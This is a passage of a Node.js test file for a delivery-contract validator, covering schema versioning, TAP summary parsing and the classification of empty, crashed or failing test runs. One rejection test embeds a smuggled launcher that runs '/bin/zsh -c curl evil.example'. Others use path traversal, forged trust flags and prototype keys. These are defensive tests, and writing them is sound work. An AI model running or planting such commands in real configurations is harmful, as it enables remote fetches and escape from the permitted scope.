import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import { spawnSync } from 'node:child_process';
import os from 'node:os';
import fs from 'node:fs';
import path from 'node:path';
import test from 'node:test';
import { fileURLToPath } from 'node:url';
import { CONTRACTS, parseContract } from '../contracts/delivery/index.js';
import {
  parseTapSummary,
  classifyRunOutcome,
  evaluateExecutionDenominator,
  requireValidRed,
  evaluateExecution,
} from '../lib/delivery/test-contract.js';

const sha = (label) => crypto.createHash('sha256').update(label).digest('hex');

const FROZEN_CONTRACTS = [
  'SDD.Delivery.ActionBinding',
  'SDD.Delivery.FoundationLock',
  'SDD.Delivery.BaselineRef',
  'SDD.Delivery.TestContract',
  'SDD.Delivery.PlanBundle',
  'SDD.Delivery.CandidateRef',
  'SDD.Delivery.EvidenceEnvelope',
  'SDD.Delivery.GateReceipt',
  'SDD.Delivery.ReleaseReceipt',
];

function foundationLockFixture() {
  return {
    schemaVersion: 1,
    release: { commit: '601813f', exportDigest: sha('export') },
    skills: [{ name: 'test-authoring', digest: sha('skill/test-authoring') }],
    policy: { schemaRef: 'hooks.yaml@601813f', digest: sha('hooks.yaml') },
    toolchain: {
      cli: { name: 'sdd', version: '0.2.4' },
      runner: { name: 'comet', version: '0.4.5' },
      node: '22.16.0',
      platforms: ['darwin-arm64', 'linux-x64'],
    },
    profile: 'managed-pilot',
  };
}

const testDir = path.dirname(fileURLToPath(import.meta.url));

function foundationLockWithExtensionsFixture() {
  const payload = foundationLockFixture();
  payload.mcps = [
    { name: 'chrome-devtools', version: '1.2.3', digest: sha('mcp/chrome-devtools') },
    { name: 'github', digest: sha('mcp/github') },
  ];
  payload.methodProfile = {
    path: 'openspec/changes/delivery-foundation-rearchitecture/method-profile-manifest.json',
    digest: sha('method-profile'),
    profile: 'comet-classic',
  };
  return payload;
}

function baselineRefFixture() {
  return {
    schemaVersion: 1,
    project: 'sdd-harness',
    change: 'delivery-foundation-rearchitecture',
    kind: 'product',
    revision: 'r1',
    digest: sha('product-r1'),
    confirmedBy: 'product-owner',
    confirmationScope: 'AC A01-A08',
  };
}

function testContractFixture() {
  return {
    schemaVersion: 1,
    project: 'sdd-harness',
    change: 'delivery-foundation-rearchitecture',
    cases: [{ id: 'c1', ac: 'A03', oracle: 'TAP summary reports at least one executed assertion' }],
    requiredChecks: [{ level: 'unit', capability: 'node:test' }],
    executionDenominator: { totalCases: 1 },
    cleanup: { environment: 'temp dir removed after run', data: 'none persisted' },
    dependencyBaselines: [{ kind: 'product', digest: sha('product-r1') }],
  };
}

function planBundleFixture() {
  return {
    schemaVersion: 1,
    change: 'delivery-foundation-rearchitecture',
    schedulerOwner: 'comet-runtime',
    tasks: [{ id: 'P2_1', dependsOn: ['P1_1'] }, { id: 'P1_1', dependsOn: [] }],
    allowedPaths: ['contracts/delivery', 'lib/delivery'],
    worktree: '.claude/worktrees/impl-p2-1',
    acceptanceRefs: ['A01', 'A02', 'A03'],
  };
}

function candidateRefFixture() {
  return {
    schemaVersion: 1,
    project: 'sdd-harness',
    change: 'delivery-foundation-rearchitecture',
    run: 'run-1',
    attempt: 1,
    backendCandidate: 'candidate-abc',
    inputDigest: sha('full-input'),
    builderExecution: 'exec-builder-1',
  };
}

function evidenceEnvelopeFixture() {
  return {
    schemaVersion: 1,
    candidateDigest: sha('full-input'),
    caseId: 'c1',
    check: 'V_A03',
    origin: { kind: 'registered-runner', id: 'runner-1' },
    execution: { id: 'exec-verifier-1' },
    environment: 'local-sandbox',
    toolchain: 'node v22.13.1',
    executions: { total: 3, valid: 2 },
    result: 'pass',
    evidence: [{ uri: '.whitebox/c1/tap.txt', sha256: sha('tap-output') }],
    expiry: '2026-11-01T00:00:00.000Z',
  };
}

function gateReceiptFixture() {
  return {
    schemaVersion: 1,
    policy: { ref: 'policy/managed-pilot', digest: sha('policy') },
    inputDigest: sha('full-input'),
    evidence: [sha('tap-output')],
    requiredDenominator: { required: 1, valid: 1 },
    blocked: [],
    sourceAttestation: { origin: 'runner-1', execution: 'exec-verifier-1' },
    verdict: 'pass',
  };
}

function releaseReceiptFixture() {
  return {
    schemaVersion: 1,
    integrationSha: '601813f',
    buildDigest: sha('build'),
    targetEnvironment: 'staging',
    configVersions: { config: 'v3', migration: '001_init' },
    deployIdentity: 'deploy-1',
    rollbackIdentity: 'rollback-1',
    readback: { ok: true, at: '2026-10-20T12:00:00.000Z', evidenceDigest: sha('readback') },
  };
}

const FIXTURES = {
  'SDD.Delivery.FoundationLock': foundationLockFixture,
  'SDD.Delivery.BaselineRef': baselineRefFixture,
  'SDD.Delivery.TestContract': testContractFixture,
  'SDD.Delivery.PlanBundle': planBundleFixture,
  'SDD.Delivery.CandidateRef': candidateRefFixture,
  'SDD.Delivery.EvidenceEnvelope': evidenceEnvelopeFixture,
  'SDD.Delivery.GateReceipt': gateReceiptFixture,
  'SDD.Delivery.ReleaseReceipt': releaseReceiptFixture,
};

test('the original eight delivery contracts and additive ActionBinding are registered at v1', () => {
  assert.deepEqual(Object.keys(CONTRACTS).sort(), [...FROZEN_CONTRACTS].sort());
  for (const name of FROZEN_CONTRACTS) {
    assert.equal(CONTRACTS[name].contract.version, 1, `${name} must be frozen at v1`);
    assert.equal(typeof CONTRACTS[name].validate, 'function');
  }
});

test('each contract parses its valid v1 payload', () => {
  for (const [name, fixture] of Object.entries(FIXTURES)) {
    const parsed = parseContract(name, fixture());
    assert.equal(parsed.ok, true, `${name} must accept its valid payload: ${parsed.errors?.join('; ') ?? ''}`);
  }
});

test('a missing schemaVersion is rejected explicitly for every contract (never guessed)', () => {
  for (const [name, fixture] of Object.entries(FIXTURES)) {
    const payload = fixture();
    delete payload.schemaVersion;
    const parsed = parseContract(name, payload);
    assert.equal(parsed.ok, false, `${name} must reject a payload without schemaVersion`);
    assert.match(parsed.errors.join('\n'), /schemaVersion/);
  }
});

test('unknown future, legacy and non-integer versions are explicitly refused, never silently accepted', () => {
  for (const [name, fixture] of Object.entries(FIXTURES)) {
    const future = fixture();
    future.schemaVersion = 2;
    const futureParsed = parseContract(name, future);
    assert.equal(futureParsed.ok, false, `${name} must refuse unknown future versions`);
    assert.match(futureParsed.errors.join('\n'), /newer than supported/);

    const legacy = fixture();
    legacy.schemaVersion = 0;
    const legacyParsed = parseContract(name, legacy);
    assert.equal(legacyParsed.ok, false, `${name} must explicitly refuse older versions with no declared mapping`);
    assert.match(legacyParsed.errors.join('\n'), /older than supported/);

    const nonInteger = fixture();
    nonInteger.schemaVersion = '1';
    const nonIntegerParsed = parseContract(name, nonInteger);
    assert.equal(nonIntegerParsed.ok, false, `${name} must refuse a non-integer schemaVersion`);
    assert.match(nonIntegerParsed.errors.join('\n'), /schemaVersion: must be an integer/);
  }
});

test('unknown contract names are refused by the registry', () => {
  const parsed = parseContract('SDD.Delivery.Unknown', {});
  assert.equal(parsed.ok, false);
  assert.match(parsed.errors.join('\n'), /unknown contract SDD\.Delivery\.Unknown/);
});

test('required content is enforced per contract with field-level errors', () => {
  const noSkills = foundationLockFixture();
  noSkills.skills = [];
  assert.match(parseContract('SDD.Delivery.FoundationLock', noSkills).errors.join('\n'), /skills/);

  const noCommit = foundationLockFixture();
  delete noCommit.release.commit;
  assert.match(parseContract('SDD.Delivery.FoundationLock', noCommit).errors.join('\n'), /release\.commit/);

  const badDigest = baselineRefFixture();
  badDigest.digest = 'not-a-digest';
  assert.match(parseContract('SDD.Delivery.BaselineRef', badDigest).errors.join('\n'), /must be a sha256 hex digest/);

  const badKind = baselineRefFixture();
  badKind.kind = 'marketing';
  assert.match(parseContract('SDD.Delivery.BaselineRef', badKind).errors.join('\n'), /must be one of/);

  const noCases = testContractFixture();
  noCases.cases = [];
  assert.match(parseContract('SDD.Delivery.TestContract', noCases).errors.join('\n'), /cases/);

  const zeroDenominator = testContractFixture();
  zeroDenominator.executionDenominator.totalCases = 0;
  assert.match(parseContract('SDD.Delivery.TestContract', zeroDenominator).errors.join('\n'), /executionDenominator\.totalCases/);

  const noEvidence = evidenceEnvelopeFixture();
  noEvidence.evidence = [];
  assert.match(parseContract('SDD.Delivery.EvidenceEnvelope', noEvidence).errors.join('\n'), /evidence/);

  const badResult = evidenceEnvelopeFixture();
  badResult.result = 'approved';
  assert.match(parseContract('SDD.Delivery.EvidenceEnvelope', badResult).errors.join('\n'), /must be one of/);

  const zeroRequired = gateReceiptFixture();
  zeroRequired.requiredDenominator.required = 0;
  assert.match(parseContract('SDD.Delivery.GateReceipt', zeroRequired).errors.join('\n'), /requiredDenominator\.required/);

  const noReadback = releaseReceiptFixture();
  noReadback.readback.ok = false;
  assert.match(parseContract('SDD.Delivery.ReleaseReceipt', noReadback).errors.join('\n'), /readback\.ok/);
});

const TAP_PASS = [
  'TAP version 13',
  'ok 1 - a passes',
  '1..1',
  '# tests 1',
  '# suites 0',
  '# pass 1',
  '# fail 0',
  '# cancelled 0',
  '# skipped 0',
  '# todo 0',
  '# duration_ms 5',
  '',
].join('\n');

const TAP_ZERO_TESTS = [
  'TAP version 13',
  '1..0',
  '# tests 0',
  '# suites 0',
  '# pass 0',
  '# fail 0',
  '# cancelled 0',
  '# skipped 0',
  '# todo 0',
  '',
].join('\n');

const TAP_ALL_SKIP = [
  'TAP version 13',
  '# Subtest: s1',
  'ok 1 - s1 # SKIP environment not provisioned',
  'ok 2 - s2 # SKIP',
  '1..2',
  '# tests 2',
  '# suites 0',
  '# pass 0',
  '# fail 0',
  '# cancelled 0',
  '# skipped 2',
  '# todo 0',
  '',
].join('\n');

const TAP_ENV_CRASH = [
  'TAP version 13',
  '# Subtest: loads env dependency',
  'not ok 1 - loads env dependency',
  '  ---',
  '  code: ERR_MODULE_NOT_FOUND',
  '  ...',
  '1..1',
  '# tests 1',
  '# suites 0',
  '# pass 0',
  '# fail 1',
  '# cancelled 0',
  '# skipped 0',
  "# Error: Cannot find package 'missing-env-dep'",
  '',
].join('\n');

const TAP_BEHAVIOR_RED = [
  'TAP version 13',
  'not ok 1 - oracle mismatch',
  '  ---',
  '  operator: equal',
  '  expected: 3',
  '  actual: 2',
  '  ...',
  '1..1',
  '# tests 3',
  '# suites 0',
  '# pass 2',
  '# fail 1',
  '# cancelled 0',
  '# skipped 0',
  '',
].join('\n');

test('FoundationLock models the exporter artifact: mcps and methodProfile payloads pass', () => {
  const parsed = parseContract('SDD.Delivery.FoundationLock', foundationLockWithExtensionsFixture());
  assert.equal(parsed.ok, true, parsed.errors?.join('; ') ?? '');
});

test('FoundationLock v1 accepts the real exported foundation lock artifact', () => {
  const artifactPath = path.resolve(testDir, '../foundation/foundation-lock.json');
  const artifact = JSON.parse(fs.readFileSync(artifactPath, 'utf8'));
  const parsed = parseContract('SDD.Delivery.FoundationLock', artifact);
  assert.equal(parsed.ok, true, parsed.errors?.join('; ') ?? '');
});

test('FoundationLock rejects machine absolute paths in version and path fields (ABSOLUTE_PATH_FORBIDDEN)', () => {
  const inVersion = foundationLockFixture();
  inVersion.toolchain.cli.version = '/Users/mac/bin/node';
  assert.match(parseContract('SDD.Delivery.FoundationLock', inVersion).errors.join('\n'), /ABSOLUTE_PATH_FORBIDDEN/);

  const inSchemaRef = foundationLockFixture();
  inSchemaRef.policy.schemaRef = '/Users/mac/repo/hooks.yaml';
  assert.match(parseContract('SDD.Delivery.FoundationLock', inSchemaRef).errors.join('\n'), /ABSOLUTE_PATH_FORBIDDEN/);

  const inProfilePath = foundationLockWithExtensionsFixture();
  inProfilePath.methodProfile.path = '/Users/mac/repo/method-profile-manifest.json';
  assert.match(parseContract('SDD.Delivery.FoundationLock', inProfilePath).errors.join('\n'), /ABSOLUTE_PATH_FORBIDDEN/);
});

test('FoundationLock rejects floating versions (latest/HEAD/@latest/unpinned ranges) in version fields', () => {
  for (const floating of ['@latest', 'HEAD', 'latest', '1.x', '^1.2.3']) {
    const payload = foundationLockFixture();
    payload.toolchain.runner.version = floating;
    const parsed = parseContract('SDD.Delivery.FoundationLock', payload);
    assert.equal(parsed.ok, false, `runner.version=${floating} must be refused`);
    assert.match(parsed.errors.join('\n'), /floating versions are forbidden/);
  }

  const mcpFloating = foundationLockFixture();
  mcpFloating.mcps = [{ name: 'llmwiki', version: 'latest', digest: sha('mcp/llmwiki') }];
  assert.match(parseContract('SDD.Delivery.FoundationLock', mcpFloating).errors.join('\n'), /floating versions are forbidden/);

  const pinned = foundationLockFixture();
  pinned.toolchain.node = '24.15.0';
  pinned.toolchain.cli.version = '0.2.4';
  assert.equal(parseContract('SDD.Delivery.FoundationLock', pinned).ok, true, 'pinned releases must keep passing');
});

test('FoundationLock v1 has a closed top-level field set; BaselineRef keeps the additive evolution path', () => {
  const smuggled = foundationLockFixture();
  smuggled.mcpLaunchers = [{ command: '/bin/zsh', args: ['-c', 'curl evil.example'] }];
  const parsed = parseContract('SDD.Delivery.FoundationLock', smuggled);
  assert.equal(parsed.ok, false, 'unmodeled launch data must not ride on the lock');
  assert.match(parsed.errors.join('\n'), /mcpLaunchers: unknown field/);
  assert.match(parsed.errors.join('\n'), /closed field set/);

  const evolving = baselineRefFixture();
  evolving.futureAnnotation = 'reserved-for-additive-v1-evolution';
  assert.equal(parseContract('SDD.Delivery.BaselineRef', evolving).ok, true,
    'contracts without a closed field set keep the extra-field evolution path');
});

test('parseTapSummary reads the top-level TAP summary and rejects output without one', () => {
  const summary = parseTapSummary(TAP_BEHAVIOR_RED);
  assert.deepEqual(summary, { tests: 3, suites: 0, pass: 2, fail: 1, cancelled: 0, skipped: 0, todo: 0 });
  const nested = [
    '# Subtest: suite',
    '    # Subtest: inner',
    '    ok 1 - inner',
    '    1..1',
    '    # tests 1',
    '    # pass 1',
    '    # fail 0',
    '1..1',
    '# tests 5',
    '# pass 4',
    '# fail 1',
    '',
  ].join('\n');
  const topLevel = parseTapSummary(nested);
  assert.equal(topLevel.tests, 5, 'nested suite summaries must not shadow the top-level denominator');
  assert.equal(topLevel.pass, 4);
  assert.equal(parseTapSummary('command produced no TAP output at all'), null);
});

test('A03: zero-test and all-skip runs are classified as empty, not pass', () => {
  const zero = classifyRunOutcome({ exitCode: 0, output: TAP_ZERO_TESTS });
  assert.equal(zero.kind, 'empty');
  const allSkip = classifyRunOutcome({ exitCode: 0, output: TAP_ALL_SKIP });
  assert.equal(allSkip.kind, 'empty');
  assert.equal(allSkip.summary.skipped, 2);
});

test('A04: environment crashes are classified as environment failures, never behavior RED', () => {
  const crashOutput = classifyRunOutcome({ exitCode: 1, output: TAP_ENV_CRASH });
  assert.equal(crashOutput.kind, 'environment-failure');
  assert.ok(crashOutput.signatures.length > 0);
  assert.match(crashOutput.signatures.join('; '), /module resolution failure/);

  const spawnError = Object.assign(new Error('spawn npm ENOENT'), { code: 'ENOENT' });
  const spawnFailure = classifyRunOutcome({ exitCode: null, output: '', spawnError });
  assert.equal(spawnFailure.kind, 'environment-failure');
  assert.match(spawnFailure.signatures.join('; '), /ENOENT/);

  const hardCrash = classifyRunOutcome({ exitCode: 139, output: 'Segmentation fault' });
  assert.equal(hardCrash.kind, 'environment-failure', 'a crash with no TAP summary must not count as test evidence');
});

test('real behavior failures without environment signatures are behavior RED', () => {
  const outcome = classifyRunOutcome({ exitCode: 1, output: TAP_BEHAVIOR_RED });
  assert.equal(outcome.kind, 'behavior-red');
  assert.equal(outcome.summary.fail, 1);
  assert.deepEqual(outcome.signatures, []);
});

test('an exit code contradicting a passing TAP summary is a conservative environment failure', () => {
  const contradictory = classifyRunOutcome({ exitCode: 3, output: TAP_PASS });
  assert.equal(contradictory.kind, 'environment-failure');
  assert.match(contradictory.signatures.join('; '), /exit code/);
  assert.equal(classifyRunOutcome({ exitCode: 0, output: TAP_PASS }).kind, 'pass');
});

test('the execution denominator refuses zero tests and zero effective executions', () => {
  const zero = evaluateExecutionDenominator({ summary: parseTapSummary(TAP_ZERO_TESTS) });
  assert.equal(zero.valid, false);
  assert.match(zero.reasons.join('\n'), /zero tests executed/);

  const allSkip = evaluateExecutionDenominator({ summary: parseTapSummary(TAP_ALL_SKIP) });
  assert.equal(allSkip.valid, false);
  assert.match(allSkip.reasons.join('\n'), /zero effective executions/);
  assert.match(allSkip.reasons.join('\n'), /2 skipped/);

  const real = evaluateExecutionDenominator({ summary: parseTapSummary(TAP_BEHAVIOR_RED) });
  assert.equal(real.valid, true);
  assert.equal(real.validExecutions, 3);
});

test('A04: requireValidRed accepts behavior RED and refuses environment/empty/pass runs', () => {
  const red = requireValidRed({ exitCode: 1, output: TAP_BEHAVIOR_RED });
  assert.equal(red.ok, true);
  assert.equal(red.outcome.summary.tests, 3, 'the accepted RED must carry a real executed denominator');

  const env = requireValidRed({ exitCode: 1, output: TAP_ENV_CRASH });
  assert.equal(env.ok, false);
  assert.match(env.reason, /environment failure is not a valid behavior RED/);

  const empty = requireValidRed({ exitCode: 0, output: TAP_ALL_SKIP });
  assert.equal(empty.ok, false);
  assert.match(empty.reason, /zero valid executions is not a valid behavior RED/);

  const pass = requireValidRed({ exitCode: 0, output: TAP_PASS });
  assert.equal(pass.ok, false);
  assert.match(pass.reason, /no RED to record/);
});

test('evaluateExecution accepts a passing run that meets the declared denominator', () => {
  const result = evaluateExecution({ testContract: testContractFixture(), run: { exitCode: 0, output: TAP_PASS } });
  assert.equal(result.verdict, 'accept');
  assert.deepEqual(result.reasons, []);
  assert.equal(result.observedValidExecutions, 1);
});

test('A03: evaluateExecution refuses zero-test, all-skip and environment-crash runs', () => {
  const zero = evaluateExecution({ testContract: testContractFixture(), run: { exitCode: 0, output: TAP_ZERO_TESTS } });
  assert.equal(zero.verdict, 'reject');
  assert.match(zero.reasons.join('\n'), /zero tests executed/);

  const allSkip = evaluateExecution({ testContract: testContractFixture(), run: { exitCode: 0, output: TAP_ALL_SKIP } });
  assert.equal(allSkip.verdict, 'reject');
  assert.match(allSkip.reasons.join('\n'), /zero effective executions/);

  const env = evaluateExecution({ testContract: testContractFixture(), run: { exitCode: 1, output: TAP_ENV_CRASH } });
  assert.equal(env.verdict, 'reject');
  assert.match(env.reasons.join('\n'), /environment failure is not valid acceptance evidence/);
});

test('evaluateExecution refuses an invalid TestContract and an unmet declared denominator', () => {
  const broken = testContractFixture();
  delete broken.requiredChecks;
  const invalidContract = evaluateExecution({ testContract: broken, run: { exitCode: 0, output: TAP_PASS } });
  assert.equal(invalidContract.verdict, 'reject');
  assert.match(invalidContract.reasons.join('\n'), /invalid TestContract/);
  assert.match(invalidContract.reasons.join('\n'), /requiredChecks/);

  const demanding = testContractFixture();
  demanding.executionDenominator.totalCases = 5;
  const unmet = evaluateExecution({ testContract: demanding, run: { exitCode: 0, output: TAP_PASS } });
  assert.equal(unmet.verdict, 'reject');
  assert.match(unmet.reasons.join('\n'), /execution denominator unmet: declared 5, observed 1/);
});

test('a behavior-red run is refused as acceptance evidence even when the denominator is met', () => {
  const result = evaluateExecution({ testContract: testContractFixture(), run: { exitCode: 1, output: TAP_BEHAVIOR_RED } });
  assert.equal(result.verdict, 'reject');
  assert.match(result.reasons.join('\n'), /acceptance requires a passing run/);
});

test('cancelled or partially skipped required runs never become passing execution or valid RED evidence', () => {
  const cancelled = TAP_PASS.replace('# cancelled 0', '# cancelled 1').replace('# tests 1', '# tests 2');
  assert.equal(evaluateExecution({ testContract: testContractFixture(), run: { exitCode: 0, output: cancelled } }).verdict, 'reject');
  const contradictory = TAP_BEHAVIOR_RED.replace('# tests 3', '# tests 0');
  assert.equal(requireValidRed({ exitCode: 1, output: contradictory }).ok, false);
});

const actionBindingFixture = () => ({
  schemaVersion: 1, profile: 'comet-managed-v2', runnerId: 'comet-classic', run: 'run-1',
  action: 'review-design', gate: 'A', execution: 'exec-review-1', role: 'reviewer', revision: 'design-r2', attempt: 1, epoch: 0,
  inputDigest: sha('input'), policyDigest: sha('policy'), environmentDigest: sha('environment'),
  workPackage: { id: 'wp-1', taskIds: ['2.1.a'] },
  methods: [{ name: 'grill-me', version: '1.0.0', ref: '.agents/skills/grill-me/SKILL.md', digest: sha('method') }],
  allowedPaths: ['reports/review.json'], allowedTools: ['read_file'],
  inputs: [{ name: 'design', ref: 'openspec/changes/change/design.md', digest: sha('design') }],
  outputs: [{ name: 'review', ref: 'reports/review.json' }],
});

test('ActionBinding parses immutable generic work-package data without granting origin or dispatch authority', () => {
  const input = actionBindingFixture();
  const parsed = parseContract('SDD.Delivery.ActionBinding', input);
  assert.equal(parsed.ok, true, parsed.errors?.join('; '));
  input.methods[0].digest = sha('changed-after-validation');
  assert.equal(parsed.value.methods[0].digest, sha('method'));
  assert.equal(Object.isFrozen(parsed.value.methods[0]), true);
  assert.equal(parsed.value.trusted, undefined);
  assert.equal(parsed.value.currentPhase, undefined);
});

test('ActionBinding rejects unsafe scope, mutable methods, forged trust and embedded control state', () => {
  for (const mutate of [
    (x) => { x.allowedPaths = ['../other-project']; },
    (x) => { x.outputs[0].ref = '/Volumes/data/report.json'; },
    (x) => { x.inputs[0].ref = 'C:\\private\\input'; },
    (x) => { x.methods[0].version = 'latest'; },
    (x) => { x.methods[0].trusted = true; },
    (x) => { x.currentPhase = 'build'; },
    (x) => { x.trusted = true; },
    (x) => { x.methods = []; },
    (x) => { x.revision = ' '; },
    (x) => { x.allowedTools = ['*']; },
  ]) {
    const input = actionBindingFixture(); mutate(input);
    assert.equal(parseContract('SDD.Delivery.ActionBinding', input).ok, false, JSON.stringify(input));
  }
});

test('a command-bound contract cannot accept counts from unrelated cases or an unexecuted required command', () => {
  const contract = testContractFixture();
  contract.commandBindingsRequired = true;
  contract.cases[0].checkIds = ['v1'];
  contract.requiredChecks[0] = { ...contract.requiredChecks[0], id: 'v1', command: 'node --test test/feature.test.js', caseIds: ['c1'] };
  const passing = { exitCode: 0, output: TAP_PASS };
  assert.equal(evaluateExecution({ testContract: contract, run: passing }).verdict, 'reject');
  const caseResults = [{ caseId: 'c1', checkId: 'v1', command: 'node --test test/feature.test.js', status: 'pass' }];
  assert.equal(evaluateExecution({ testContract: contract, run: { ...passing, caseResults } }).verdict, 'accept');
  for (const changed of [[], [{ ...caseResults[0], caseId: 'other' }], [{ ...caseResults[0], command: 'printf pass' }], [{ ...caseResults[0], status: 'skipped' }]]) {
    assert.equal(evaluateExecution({ testContract: contract, run: { ...passing, caseResults: changed } }).verdict, 'reject');
  }
});

test('a command-bound denominator cannot undercount its distinct required cases', () => {
  const contract = testContractFixture();
  contract.commandBindingsRequired = true;
  contract.cases = [{ id: 'c1', ac: 'A03', oracle: 'first outcome', checkIds: ['v1'] }, { id: 'c2', ac: 'A03', oracle: 'second outcome', checkIds: ['v1'] }];
  contract.requiredChecks[0] = { ...contract.requiredChecks[0], id: 'v1', command: 'node --test test/feature.test.js', caseIds: ['c1', 'c2'] };
  assert.equal(parseContract('SDD.Delivery.TestContract', contract).ok, false);
  contract.executionDenominator.totalCases = 2;
  assert.equal(parseContract('SDD.Delivery.TestContract', contract).ok, true);
});

test('strict intent cannot leave a required command outside the mandatory case graph', () => {
  const contract = testContractFixture(); contract.commandBindingsRequired = true;
  contract.cases[0].checkIds = ['v1'];
  contract.requiredChecks = [{ id: 'v1', level: 'unit', capability: 'unit', command: 'node --test one.test.js', caseIds: ['c1'] }, { id: 'v2', level: 'unit', capability: 'other', command: 'node --test two.test.js', caseIds: ['c1'] }];
  assert.equal(parseContract('SDD.Delivery.TestContract', contract).ok, false);
  contract.cases[0].checkIds.push('v2');
  assert.equal(parseContract('SDD.Delivery.TestContract', contract).ok, true);
  contract.cases[0].required = false;
  assert.equal(parseContract('SDD.Delivery.TestContract', contract).ok, false);
});

test('prototype member names are not registered contracts or declared ActionBinding fields', () => {
  assert.equal(parseContract('constructor', {}).ok, false);
  assert.equal(parseContract('toString', {}).ok, false);
  for (const field of ['constructor', 'toString', '__proto__']) {
    const payload = JSON.parse(JSON.stringify(actionBindingFixture()));
    Object.defineProperty(payload, field, { enumerable: true, value: { trusted: true } });
    assert.equal(parseContract('SDD.Delivery.ActionBinding', payload).ok, false, field);
  }
});

test('ActionBinding output targets must stay inside its declared write scope', () => {
  const payload = actionBindingFixture(); payload.outputs[0].ref = 'other-project/write.json';
  assert.equal(parseContract('SDD.Delivery.ActionBinding', payload).ok, false);
  payload.allowedPaths = ['reports']; payload.outputs[0].ref = 'reports/nested/review.json';
  assert.equal(parseContract('SDD.Delivery.ActionBinding', payload).ok, true);
  payload.outputs[0].ref = 'reports-other/write.json';
  assert.equal(parseContract('SDD.Delivery.ActionBinding', payload).ok, false);
});

test('protected caller strictness cannot be downgraded by an old contract, false flag or self-declared profile', () => {
  const passing = { exitCode: 0, output: TAP_PASS };
  for (const amend of [() => {}, (c) => { c.commandBindingsRequired = false; }, (c) => { c.profile = 'comet-managed-v2'; c.trusted = true; }]) {
    const contract = testContractFixture(); amend(contract);
    const result = evaluateExecution({ testContract: contract, run: passing }, { requireCommands: true });
    assert.equal(result.verdict, 'reject');
    assert.equal(result.scope, 'component/required-command-links');
    assert.equal(result.managedClosureEligible, false);
  }
  const compatibility = evaluateExecution({ testContract: testContractFixture(), run: passing });
  assert.equal(compatibility.verdict, 'accept');
  assert.equal(compatibility.scope, 'component/ac-only');
  assert.equal(compatibility.managedClosureEligible, false);
  const contract = testContractFixture(); contract.commandBindingsRequired = true;
  contract.cases[0].checkIds = ['v1'];
  contract.requiredChecks[0] = { ...contract.requiredChecks[0], id: 'v1', command: 'node --test feature.test.js', caseIds: ['c1'] };
  const caseResults = [{ caseId: 'c1', checkId: 'v1', command: 'node --test feature.test.js', status: 'pass' }];
  const bound = evaluateExecution({ testContract: contract, run: { ...passing, caseResults } }, { requireCommands: true });
  assert.equal(bound.verdict, 'accept');
  assert.equal(bound.scope, 'component/required-command-links');
  assert.equal(bound.managedClosureEligible, false);
});


test('a real zero-exit wrapper carrying a failed TAP assertion is not valid behavior RED', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'p21-contradictory-exit-'));
  try {
    const file = path.join(root, 'failure.test.mjs');
    fs.writeFileSync(file, "import test from 'node:test'; import assert from 'node:assert/strict'; test('actual oracle fails', () => assert.equal(1, 2));\n");
    const env = { ...process.env }; delete env.NODE_TEST_CONTEXT;
    const wrapper = "import { spawnSync } from 'node:child_process'; const env = { ...process.env }; delete env.NODE_TEST_CONTEXT; const child = spawnSync(process.execPath, ['--test', '--test-reporter=tap', process.argv[1]], { env, encoding: 'utf8' }); process.stdout.write(child.stdout); process.exit(0);";
    const result = spawnSync(process.execPath, ['--input-type=module', '-e', wrapper, file], { env, encoding: 'utf8' });
    assert.equal(result.status, 0);
    assert.equal(parseTapSummary(result.stdout).fail, 1);
    assert.equal(requireValidRed({ exitCode: result.status, output: result.stdout }).ok, false);
    const normal = spawnSync(process.execPath, ['--test', '--test-reporter=tap', file], { env, encoding: 'utf8' });
    assert.equal(normal.status, 1);
    assert.equal(requireValidRed({ exitCode: normal.status, output: normal.stdout }).ok, true);
    assert.equal(requireValidRed({ exitCode: null, output: normal.stdout }).ok, false);
  } finally { fs.rmSync(root, { recursive: true, force: true }); }
});

function filteredTap(names) {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'p21-filtered-'));
  try {
    const files = names.map((name, index) => {
      const file = `case-${index}.mjs`;
      fs.writeFileSync(path.join(root, file), `import test from 'node:test'; test(${JSON.stringify(name)}, () => {});\n`);
      return file;
    });
    const env = { ...process.env };
    delete env.NODE_TEST_CONTEXT;
    const result = spawnSync(process.execPath, ['--test', '--test-reporter=tap', '--test-name-pattern=TARGET', ...files], { cwd: root, env, encoding: 'utf8', timeout: 10000 });
    assert.equal(result.status, 0, result.stderr);
    return result.stdout;
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
  }
}

test('filtered file with zero leaf tests is not a passing execution', () => {
  const output = filteredTap(['OTHER']);
  assert.equal(classifyRunOutcome({ exitCode: 0, output }).kind, 'empty');
  assert.equal(parseTapSummary(output).tests, 0);
});

test('mixed filtered files count only actual selected leaf tests', () => {
  const output = filteredTap(['OTHER', 'TARGET']);
  const outcome = classifyRunOutcome({ exitCode: 0, output });
  assert.equal(outcome.kind, 'pass');
  assert.equal(outcome.summary.tests, 1);
  assert.equal(outcome.summary.pass, 1);
});

test('multiple filtered files with no selected leaves remain empty', () => {
  const output = filteredTap(['OTHER', 'ANOTHER']);
  const outcome = classifyRunOutcome({ exitCode: 0, output });
  assert.equal(outcome.kind, 'empty');
  assert.equal(outcome.summary.tests, 0);
});

test('required acceptance rejects skipped or todo test points even when another test passes', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'p21-required-'));
  try {
    for (const method of ['skip', 'todo']) {
      fs.writeFileSync(path.join(root, 'case.mjs'), `import test from 'node:test'; test('executed', () => {}); test.${method}('missing', () => {});\n`);
      const env = { ...process.env };
      delete env.NODE_TEST_CONTEXT;
      const result = spawnSync(process.execPath, ['--test', '--test-reporter=tap', 'case.mjs'], { cwd: root, env, encoding: 'utf8', timeout: 10000 });
      assert.equal(result.status, 0, result.stderr);
      const decision = evaluateExecution({ testContract: testContractFixture(), run: { exitCode: 0, output: result.stdout } });
      assert.equal(decision.verdict, 'reject', `${method} needs explicit optionality proof`);
    }
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
  }
});

test('required acceptance rejects a passing parent whose nested test was skipped', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'p21-nested-'));
  try {
    fs.writeFileSync(path.join(root, 'case.mjs'), "import test from 'node:test'; test('parent', async t => { await t.test('child', { skip: true }, () => {}); });\n");
    const env = { ...process.env };
    delete env.NODE_TEST_CONTEXT;
    const result = spawnSync(process.execPath, ['--test', '--test-reporter=tap', 'case.mjs'], { cwd: root, env, encoding: 'utf8', timeout: 10000 });
    assert.equal(result.status, 0, result.stderr);
